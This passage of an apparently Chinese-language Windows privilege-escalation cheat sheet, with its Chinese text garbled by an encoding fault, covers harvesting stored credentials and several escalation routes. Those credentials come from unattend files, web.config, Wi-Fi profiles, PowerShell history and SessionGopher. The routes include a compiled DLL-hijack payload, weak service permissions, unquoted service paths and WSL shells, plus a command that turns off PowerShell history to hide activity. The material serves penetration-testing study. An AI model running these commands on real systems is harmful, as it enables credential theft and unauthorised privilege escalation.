     </span><span class="err">&lt;</span><span class="n">Username</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Username</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/AutoLogon</span><span class="err">&gt;</span><span class="w">

    </span><span class="err">&lt;</span><span class="n">UserAccounts</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">LocalAccounts</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">LocalAccount</span><span class="w"> </span><span class="nx">wcm:action</span><span class="o">=</span><span class="s2">"add"</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="o">*</span><span class="nx">SENSITIVE</span><span class="o">*</span><span class="nx">DATA</span><span class="o">*</span><span class="nx">DELETED</span><span class="o">*</span><span class="err">&lt;</span><span class="nx">/Password</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Group</span><span class="err">&gt;</span><span class="nx">administrators</span><span class="p">;</span><span class="n">users</span><span class="err">&lt;</span><span class="nx">/Group</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Name</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Name</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">/LocalAccount</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">/LocalAccounts</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/UserAccounts</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> 
</span><span class="n">SecretSecurePassword1234</span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The Metasploit module <code class="language-plaintext highlighter-rouge">post/windows/gather/enum_unattend</code> looks for these files.</p>

<ul>
  <li><a href="https://www.cnblogs.com/zpchcbd/p/12232683.html">Unattended Installsææƒ - zpchcbd - åšå®¢å›­</a></li>
</ul>

<h3 id="iis-web-config-ä¸­çš„å¯†ç ">IIS Web config ä¸­çš„å¯†ç </h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">â€“</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><span class="w">
</span><span class="nx">C:\inetpub\wwwroot\web.config</span><span class="w">
</span></code></pre></div></div>

<h3 id="å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶">å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶</h3>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SYSTEMDRIVE%</span>\pagefile.sys
<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\sam
<span class="nv">%WINDIR%</span>\repair\system
<span class="nv">%WINDIR%</span>\repair\software<span class="o">,</span> <span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%WINDIR%</span>\iis6.log
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\<span class="o">*</span>.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS<span class="o">~</span><span class="m">1</span>\Tempor<span class="o">~</span><span class="m">1</span>\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts
<span class="kd">C</span>:\ProgramData\Configs\<span class="o">*</span>
<span class="kd">C</span>:\Program <span class="kd">Files</span>\Windows <span class="kd">PowerShell</span>\<span class="o">*</span>
<span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">vnc</span>.ini <span class="na">/s /b
</span><span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">ultravnc</span>.ini <span class="na">/s /b
</span></code></pre></div></div>

<h3 id="wifi-å¯†ç ">Wifi å¯†ç </h3>

<p>Find AP SSID</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span>
</code></pre></div></div>

<p>Get Cleartext Pass</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span> <span class="o">&lt;</span><span class="kd">SSID</span><span class="o">&gt;</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span>
</code></pre></div></div>

<p>Oneliner method to extract wifi passwords from all the access point.</p>

<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span> <span class="o">&amp;</span> <span class="nb">echo</span>. <span class="o">&amp;</span> <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=4 delims=: "</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan show profiles </span><span class="se">^|</span><span class="s1"> find "Profile "'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="na">off</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;</span> <span class="o">(</span><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profiles</span> <span class="kd">name</span><span class="o">=</span><span class="vm">%a</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SSID Cipher Content"</span> <span class="o">|</span> <span class="nb">find</span> <span class="na">/v </span><span class="s2">"Number"</span> <span class="o">&amp;</span> <span class="nb">echo</span>.<span class="o">)</span> <span class="o">&amp;</span> @echo <span class="na">on</span>
</code></pre></div></div>
<p>æ³¨æ„ï¼Œè¯¥ä¸€å¥è¯ä»…å¯¹è‹±æ–‡ç³»ç»Ÿæœ‰ç”¨ï¼Œä¸­æ–‡ç³»ç»Ÿéœ€è¦ä¿®æ”¹åŒ¹é…å­—æ®µã€‚</p>

<h3 id="ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç ">ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>The sticky notes app stores itâ€™s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</p>

<h3 id="æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç ">æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path<span class="se">\t</span>o<span class="se">\S</span>essionGopher.ps1<span class="p">;</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-o</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-u</span> domain.com<span class="se">\a</span>dm-arvanaghi <span class="nt">-p</span> s3cr3tP@ss
</code></pre></div></div>
<h3 id="key-manager-ä¸­å­˜æ”¾çš„å¯†ç ">Key Manager ä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>This software will display its output in a GUI</p>

<p>ä¸‹é¢çš„å‘½ä»¤å°†æ‰“å¼€ windows å‡­æ®ç®¡ç†å™¨ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 keymgr,KRShowKeyMgr
</code></pre></div></div>
<h3 id="powershell-å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç ">Powershell å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç </h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>wissky<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type</span> <span class="nv">$env</span>:APPDATA<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath | sls passw
</code></pre></div></div>

<p>å…³é—­ ps å†å²è®°å½•</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-PSReadlineOption <span class="nt">-HistorySaveStyle</span> SaveNothing
</code></pre></div></div>

<h3 id="powershell-transcript-æ–‡ä»¶">Powershell Transcript æ–‡ä»¶</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;<span class="se">\D</span>ocuments<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
C:<span class="se">\T</span>ranscripts<span class="se">\&lt;</span>DATE&gt;<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
</code></pre></div></div>

<h3 id="å¤‡ç”¨æ•°æ®æµadsä¸­çš„å¯†ç ">å¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰ä¸­çš„å¯†ç </h3>
<p>ADS æ˜¯æ·»åŠ åˆ°æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸º NT æ–‡ä»¶ç³»ç»Ÿ (NTFS)ï¼‰ä¸­çš„åŠŸèƒ½ï¼Œä»¥æé«˜ä¸ Macintosh åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿ (HFS) çš„å¯æ¯”æ€§ã€‚</p>

<p>ä¾‹å¦‚åœ¨ notepad ä¸­ç¼–è¾‘ä½†æœªä¿å­˜åˆ°æ–‡ä»¶çš„æ•°æ®ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">Flag</span><span class="w">
</span></code></pre></div></div>

<h3 id="laps-settings">LAPS Settings</h3>
<p>Extract <code class="language-plaintext highlighter-rouge">HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p>

<ul>
  <li>LAPS Enabled: AdmPwdEnabled</li>
  <li>LAPS Admin Account Name: AdminAccountName</li>
  <li>LAPS Password Complexity: PasswordComplexity</li>
  <li>LAPS Password Length: PasswordLength</li>
  <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li>
</ul>

<h2 id="è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼">è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼</h2>
<h3 id="å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ">å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject <span class="nt">-Query</span> <span class="s2">"Select * from Win32_Process"</span> | where <span class="o">{</span><span class="nv">$_</span>.Name <span class="nt">-notlike</span> <span class="s2">"svchost*"</span><span class="o">}</span> | Select Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | ft <span class="nt">-AutoSize</span>
</code></pre></div></div>

<h3 id="å“ªäº›è¿›ç¨‹ä»¥-system-æƒé™è¿è¡Œ">å“ªäº›è¿›ç¨‹ä»¥ system æƒé™è¿è¡Œ</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v /fi <span class="s2">"username eq system"</span>
</code></pre></div></div>
<p>å¦‚æœè¿™äº›è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼Œæˆ–åŠ è½½çš„ dll æ‰€åœ¨ç›®å½•å¯å†™çš„è¯ï¼Œå¯åˆ©ç”¨ dll åŠ«æŒææƒã€‚</p>

<h3 id="powershell-ç‰ˆæœ¬">Powershell ç‰ˆæœ¬</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\1\P</span><span class="s2">owerShellEngine"</span> /v PowerShellVersion
</code></pre></div></div>
<h3 id="æšä¸¾å·²å®‰è£…ç¨‹åº">æšä¸¾å·²å®‰è£…ç¨‹åº</h3>
<p>å·²å®‰è£…ç¨‹åºå¯ä½œä¸ºææƒçªç ´ç‚¹ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | ft Parent,Name,LastWriteTime
Get-ChildItem <span class="nt">-path</span> Registry::HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE | ft Name
</code></pre></div></div>

<h3 id="æšä¸¾å·²å®‰è£…æœåŠ¡">æšä¸¾å·²å®‰è£…æœåŠ¡</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span>
<span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>
<span class="nb">tasklist</span> <span class="na">/SVC
</span></code></pre></div></div>
<h3 id="æšä¸¾è®¡åˆ’ä»»åŠ¡">æšä¸¾è®¡åˆ’ä»»åŠ¡</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="m">2</span><span class="o">&gt;</span><span class="kr">nul</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="kd">TaskName</span>
<span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v </span><span class="o">&gt;</span> <span class="nb">schtasks</span>.txt<span class="o">;</span> <span class="kd">cat</span> <span class="kd">schtask</span>.txt <span class="o">|</span> <span class="kd">grep</span> <span class="s2">"SYSTEM\|Task To Run"</span> <span class="o">|</span> <span class="kd">grep</span> <span class="na">-B </span><span class="m">1</span> <span class="kd">SYSTEM</span>
<span class="kd">Get</span><span class="na">-ScheduledTask </span><span class="o">|</span> <span class="nb">where</span> <span class="o">{</span>$_.TaskPath <span class="na">-notlike </span><span class="s2">"\Microsoft*"</span><span class="o">}</span> <span class="o">|</span> <span class="kd">ft</span> <span class="kd">TaskName</span><span class="o">,</span><span class="kd">TaskPath</span><span class="o">,</span><span class="kd">State</span>
</code></pre></div></div>
<h3 id="æšä¸¾è‡ªå¯åŠ¨åº”ç”¨">æšä¸¾è‡ªå¯åŠ¨åº”ç”¨</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">startup</span> <span class="kd">get</span> <span class="kd">caption</span><span class="o">,</span><span class="kd">command</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\Software\Microsoft\Windows\CurrentVersion\R
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\Run
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span>
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\</span><span class="nv">%username%</span><span class="s2">\Start Menu\Programs\Startup"</span>
</code></pre></div></div>

<h2 id="åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ">åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ</h2>
<p>ä»¥ç®¡ç†å‘˜/ç³»ç»Ÿèº«ä»½è¿è¡Œä¸”æ–‡ä»¶æƒé™ä¸æ­£ç¡®çš„æœåŠ¡å¯èƒ½å¯¼è‡´ææƒï¼Œæ›¿æ¢è¯¥æ–‡ä»¶æˆ–è€…åŠ«æŒ DLLï¼ˆéœ€è¦å¯å†™æƒé™ï¼‰ï¼Œç„¶åé‡å¯è¯¥æœåŠ¡å³å¯ã€‚</p>
<h3 id="dll-åŠ«æŒ">DLL åŠ«æŒ</h3>
<ol>
  <li>å¯»æ‰¾ DLL åŠ«æŒåˆ©ç”¨ç‚¹
    <ol>
      <li>PowerSploit ä¸­çš„ PowerUp è„šæœ¬ï¼šFind-PathDLLHijack PowerUp.ps1</li>
      <li>Process Monitor : check for â€œName Not Foundâ€</li>
    </ol>
  </li>
  <li>ç¼–è¯‘æ¶æ„ DLL
    <ol>
      <li>For x64 compile with: â€œx86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€</li>
      <li>For x86 compile with: â€œi686-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€</li>
    </ol>

    <p>windows_dll.c å†…å®¹</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
         <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>å¯»æ‰¾æƒé™é…ç½®ä¸å½“çš„ PATH ç›®å½•
    <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt

 $ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

 $ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
 <span class="nb">type</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div>    </div>
  </li>
</ol>

<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºå¯èƒ½è‡ªä¸»åœ°åŠ è½½æŸäº›è·¯å¾„çš„ dllï¼Œæ­¤æ—¶å°±éœ€è¦é€†å‘ç‰¹å®šçš„åº”ç”¨æ‰å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ DLL åŠ«æŒã€‚</p>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://www.cnblogs.com/bonelee/p/16227518.html">Powershell ææƒæ¡†æ¶-Powerupâ€”â€”å¹³å¿ƒè€Œè®ºï¼Œè¿™ä¸ªææƒå·¥å…·è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œçœ‹åé¢å®æˆ˜ä¾‹å­ - bonelee - åšå®¢å›­</a></li>
</ul>

<h3 id="path-è·¯å¾„å¯å†™">PATH è·¯å¾„å¯å†™</h3>
<p>ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¯¹æœåŠ¡çš„ path è·¯è¿›å…·å¤‡çš„æƒé™è¿›è¡Œæ’æŸ¥ã€‚</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt
$ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

$ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
<span class="nb">type</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div></div>
<p>ä¸¤ç»„å‘½ä»¤éƒ½å¯ä»¥ç”¨ï¼Œä½†ä¼šç”Ÿæˆæ–‡ä»¶ã€‚</p>

<p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ msf ä¸­çš„ expï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/local/service_permissions
</code></pre></div></div>
<h3 id="windows-10---cve-2019-1322-usosvc">windows 10 - CVE-2019-1322 UsoSvc</h3>

<h3 id="windows-xp-sp1---upnphost">Windows XP SP1 - upnphost</h3>

<h2 id="åˆ©ç”¨-linux-å­ç³»ç»Ÿææƒ">åˆ©ç”¨ Linux å­ç³»ç»Ÿææƒ</h2>
<blockquote>
  <p>å‡­å€Ÿ root æƒé™ï¼ŒWindows Subsystem for Linux (WSL) å…è®¸ç”¨æˆ·åœ¨ä»»ä½•ç«¯å£ä¸Šåˆ›å»ºç»‘å®š shellï¼ˆæ— éœ€æå‡ï¼‰ã€‚  ä¸çŸ¥é“ root å¯†ç ï¼Ÿ  æ²¡é—®é¢˜ï¼Œåªéœ€å°†é»˜è®¤ç”¨æˆ·è®¾ç½®ä¸º root W/.exe â€“default-user root å³å¯ã€‚  ç°åœ¨å¯åŠ¨æ‚¨çš„ç»‘å®š shell æˆ–åå‘æ“ä½œã€‚</p>
</blockquote>

<p>Windows å­ç³»ç»Ÿçš„æ–‡ä»¶ç›®å½•ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æŸ¥çœ‹çš„ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\%</span>USERNAME%<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\C</span>anonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc<span class="se">\L</span>ocalState<span class="se">\r</span>ootfs<span class="se">\</span>
</code></pre></div></div>

<h2 id="åˆ©ç”¨æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ææƒ">åˆ©ç”¨æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ææƒ</h2>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
  <li>æœåŠ¡çš„è·¯å¾„å­˜åœ¨æ— å¼•å·ä¸”åŒ…å«ç©ºæ ¼æˆ–å…¶ä»–åˆ†éš”ç¬¦ã€‚</li>
  <li>ä¸Šçº§è·¯å¾„å¯å†™ã€‚</li>
</ul>

<blockquote>
  <p>Microsoft Windows æ— å¼•å·æœåŠ¡è·¯å¾„æšä¸¾æ¼æ´ã€‚<br />
æ‰€æœ‰ Windows æœåŠ¡éƒ½æœ‰å…¶å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚<br />
å¦‚æœè¯¥è·¯å¾„æœªåŠ å¼•å·ä¸”åŒ…å«ç©ºæ ¼æˆ–å…¶ä»–åˆ†éš”ç¬¦ï¼Œåˆ™æœåŠ¡å°†é¦–å…ˆå°è¯•è®¿é—®çˆ¶è·¯å¾„ä¸­çš„èµ„æºã€‚</p>
</blockquote>

<p>ä¾‹å¦‚ï¼š</p>
